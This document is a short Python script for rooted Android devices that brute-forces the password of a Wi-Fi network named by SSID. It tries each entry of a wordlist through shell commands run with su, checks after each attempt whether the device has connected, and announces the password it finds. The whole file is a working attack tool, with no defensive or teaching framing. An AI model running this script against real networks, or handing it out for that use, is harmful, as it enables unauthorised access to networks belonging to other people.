import subprocess
import time
import sys

SSID = "Sir"  # set your target SSID here
SECURITY = "wpa2"  # "open", "wpa2", or "wpa3"
WORDLIST_PATH = "passwords.txt"

def run_cmd(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode, result.stdout.strip(), result.stderr.strip()

def is_connected():
    """Check current connected SSID using dumpsys (root required)"""
    code, out, err = run_cmd("su -c 'dumpsys wifi | grep \"SSID\"'")
    if SSID in out:
        return True
    return False

def connect_to_wifi(password):
    cmd = f"su -c 'cmd wifi connect-network \"{SSID}\" {SECURITY} \"{password}\"'"
    code, out, err = run_cmd(cmd)
    return code == 0

def brute_force():
    print(f"📡 Starting Wi-Fi brute-force on SSID: {SSID}")

    try:
        with open(WORDLIST_PATH, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print("❌ Failed to read wordlist:", e)
        sys.exit(1)

    for i, password in enumerate(passwords, 1):
        print(f"🔁 [{i}/{len(passwords)}] Trying password: {password}")

        success = connect_to_wifi(password)
        time.sleep(5)  # wait for connection attempt

        if is_connected():
            print(f"✅ SUCCESS! Password found: {password}")
            return

        print("❌ Incorrect password.")

    print("💀 Brute-force complete. Password not found.")

# Enable Wi-Fi first
print("🔧 Enabling Wi-Fi...")
run_cmd("su -c 'svc wifi enable'")
time.sleep(3)

# Start brute-force
brute_force()
